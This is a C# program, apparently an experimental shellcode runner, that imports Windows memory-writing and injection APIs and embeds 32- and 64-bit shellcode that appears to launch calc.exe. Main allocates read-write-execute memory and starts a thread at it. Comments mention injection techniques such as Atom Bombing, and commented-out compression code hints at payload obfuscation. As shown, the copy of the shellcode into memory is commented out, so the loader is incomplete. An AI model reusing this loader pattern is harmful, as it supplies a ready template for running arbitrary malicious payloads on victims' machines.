using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Diagnostics.CodeAnalysis;
using System.Runtime.Versioning;
using System.Security.Permissions;
using System.Threading;

namespace Memory_Writing
{
    internal class Program
    {
        public enum MEM_PAGE
        {
            PAGE_NOACCESS = 0x1,
            PAGE_READONLY = 0x2,
            PAGE_READWRITE = 0x4,
            PAGE_WRITECOPY = 0x8,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_READWRITECOPY = 0x50,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400,
        }
        public enum MEM_COMMIT
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000,
            MEM_FREE = 0x10000,
            MEM_PRIVATE = 0x20000,
            MEM_MAPPED = 0x40000,
            MEM_RESET = 0x80000,
            MEM_TOP_DOWN = 0x100000,
            MEM_WRITE_WATCH = 0x200000,
            MEM_PHYSICAL = 0x400000,
            MEM_IMAGE = 0x1000000
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            MEM_COMMIT flAllocationType,
            MEM_PAGE flProtect
        );

        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(
            IntPtr Handle,
            uint Wait
        );
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );


        //[00]
        //

        //CopyMemory
        [DllImport("kernel32.dll", SetLastError = false)]
        public static extern void CopyMemory(
            IntPtr dest,
            IntPtr src,
            uint count
        );

        //CreatePipe
        [StructLayout(LayoutKind.Sequential)]
        public class SECURITY_ATTRIBUTES
        {
            internal int nLength = 0;
            public IntPtr? pSecurityDescriptor = null;
            internal int bInheritHandle = 0;
            public IntPtr lpSecurityDescriptor;
        }

        [DllImport("kernel32.dll")]
        static extern bool CreatePipe(
            out IntPtr hReadPipe,
            out IntPtr hWritePipe,
            ref SECURITY_ATTRIBUTES lpPipeAttributes, 
            uint nSize
        );

        //WriteProcessMemory
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesWritten
        );

        //Marshal.Copy

        //WriteFile
        [DllImport("kernel32.dll", BestFitMapping = true, CharSet = CharSet.Ansi)]
        static extern bool WriteFile(
            IntPtr hFile,
            System.Text.StringBuilder lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            [In] ref System.Threading.NativeOverlapped lpOverlapped
        );

        //WriteFileEx
        internal delegate void WriteFileCompletionDelegate(
            uint dwErrorCode,
            uint dwNumberOfBytesTransfered,
            ref NativeOverlapped lpOverlapped
        );
        [DllImport("kernel32.dll")]
        internal static extern bool WriteFileEx(
            IntPtr hFile,
            IntPtr lpBuffer,
            uint nNumberOfBytesToWrite, 
            [In] ref NativeOverlapped lpOverlapped,
            WriteFileCompletionDelegate lpCompletionRoutine
        );
        
        //hwrite
        [DllImport("kernel32")]
        public static extern int hwrite(IntPtr hFile, string lpBuffer, int lBytes);

        //WritePrivateProfileString
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool WritePrivateProfileString(
            string lpAppName,
            string lpKeyName,
            string lpString,
            string lpFileName
        );

        //WritePrivateProfileSection
        [DllImport("kernel32.dll")]
        static extern bool WritePrivateProfileSection(
            string lpAppName,
            string lpString,
            string lpFileName
        );

        //WriteProfileString
        [DllImport("kernel32.dll")]
        static extern bool WriteProfileString(
            string lpAppName,
            string lpKeyName,
            string lpString
        );

        //WriteProfileSection
        [DllImport("kernel32.dll")]
        static extern bool WriteProfileSection(
            string lpAppName,
            string lpString
        );

        //NtWriteVirtualMemory
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            UInt32 NumberOfBytesToWrite,
            ref UInt32 NumberOfBytesWritten
        );

        //MoveMemory
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(
            IntPtr dest,
            IntPtr src,
            int size
        );

        //memcpy
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(
            IntPtr dest,
            IntPtr src,
            UIntPtr count
        );

        //RtlMoveMemory
        [SuppressMessage("Microsoft.Security", "CA2118:ReviewSuppressUnmanagedCodeSecurityUsage")]
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        [ResourceExposure(ResourceScope.None)]
        public static extern void RtlMoveMemory(
            HandleRef destData,
            HandleRef srcData,
            int size
        );

        //UpdateProcThreadAttribute
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize
        );

        //Atom Bombing, Shared-Memory Reuse, NtMapViewOfSection,

        [DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern string RtlEthernetAddressToString(
            ref byte[] Addr,
            out string S
        );

        [Flags]
        public enum COMPRESS_ALGORITHM
        {
            COMPRESS_ALGORITHM_MSZIP = 2,
            COMPRESS_ALGORITHM_XPRESS = 3,
            COMPRESS_ALGORITHM_XPRESS_HUFF = 4,
            COMPRESS_ALGORITHM_LZMS = 5,
            COMPRESS_RAW = 1 << 29
        }

        [DllImport("Cabinet.dll")]
        public static extern bool CreateCompressor(
            COMPRESS_ALGORITHM Algorithm,
            IntPtr AllocationRoutines,
            out IntPtr CompressorHandle
        );

        [DllImport("Cabinet.dll")]
        static extern bool CreateDecompressor(
           COMPRESS_ALGORITHM Algorithm,
           IntPtr AllocationRoutines,
           out IntPtr CompressorHandle
       );

        [DllImport("Cabinet.dll")]
        static extern bool Compress(
            IntPtr CompressorHandle,
            byte[] UncompressedData,
            uint UncompressedDataSize,
            byte[] CompressedBuffer,
            uint CompressedBufferSize,
            out uint CompressedDataSize
        );

        [DllImport("Cabinet.dll")]
        static extern bool Decompress(
            IntPtr DecompressorHandle,
            byte[] CompressedData,
            uint CompressedDataaSize,
            IntPtr UncompressedBuffer,
            uint UncompressedBufferSize,
            out uint UncompressedDataSize
        );

        [DllImport("Cabinet.dll")]
        static extern bool CloseCompressor(
           IntPtr CompressHandle
        );
        
        [DllImport("Cabinet.dll")]
        public static extern bool CloseDecompressor(
            IntPtr CompressHandle
        );

        public struct shellcode
        {
            public byte[] s;
        }
        
        static void Main(string[] args)
        {
            byte[] buf;
            if (IntPtr.Size == 4)
                buf = new byte[189] {0xfc,0xe8,0x82,0x00,0x00,0x00,
                0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
                0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
                0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
                0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
                0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
                0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
                0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
                0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
                0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,
                0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,
                0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,
                0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,
                0x6c,0x63,0x00};
            else
                buf = new byte[272] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
                0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
                0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
                0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
                0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
                0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
                0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
                0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
                0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
                0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
                0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
                0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
                0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
                0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
                0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00};

            shellcode she = new shellcode();
            she.s = buf;

            uint size = (uint)buf.Length;

            IntPtr hMem = VirtualAlloc(
                IntPtr.Zero,
                size,
                MEM_COMMIT.MEM_COMMIT | MEM_COMMIT.MEM_RESERVE,
                MEM_PAGE.PAGE_EXECUTE_READWRITE
            );

            //[00]
            //IntPtr hMem = IntPtr.Zero;
            //Marshal.StructureToPtr(she, hMem, true);
            //CopyMemory(hMem, , size);

            /*
            byte[] asdf = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
            string test = string.Empty;
            RtlEthernetAddressToString(
                ref asdf, 
                out test
            );
            Console.WriteLine(Marshal.GetLastWin32Error());

            Console.WriteLine("{0:X}",test);
            */
            /*
            IntPtr com_engine = IntPtr.Zero;
            CreateCompressor(
                COMPRESS_ALGORITHM.COMPRESS_ALGORITHM_LZMS,
                IntPtr.Zero,
                out com_engine
            );

            byte[] compress_buf = new byte[2048];
            uint c_d_s = 0;
            uint compress_size = 0;
            Compress(
                com_engine,
                buf,
                size,
                null,
                0,
                out c_d_s
            );

            Console.WriteLine("{0}", c_d_s);

            Compress(
                com_engine,
                buf,
                size,
                compress_buf,
                c_d_s,
                out c_d_s
            );

            

            IntPtr decom_engine = IntPtr.Zero;
            CreateDecompressor(
                COMPRESS_ALGORITHM.COMPRESS_ALGORITHM_LZMS,
                IntPtr.Zero,
                out decom_engine
            );

            uint d_d_s = 0;
            Decompress(decom_engine, compress_buf, size, hMem, size,out d_d_s);
            */
            
            IntPtr hThread = CreateThread(
                 IntPtr.Zero,
                 0,
                 hMem,
                 IntPtr.Zero,
                 0,
                 IntPtr.Zero
            );
            WaitForSingleObject(
                hThread,
                0xFFFFFFFF
            );
            
            /*
            CloseCompressor(com_engine);
            CloseDecompressor(decom_engine);
            */
        }
    }
}
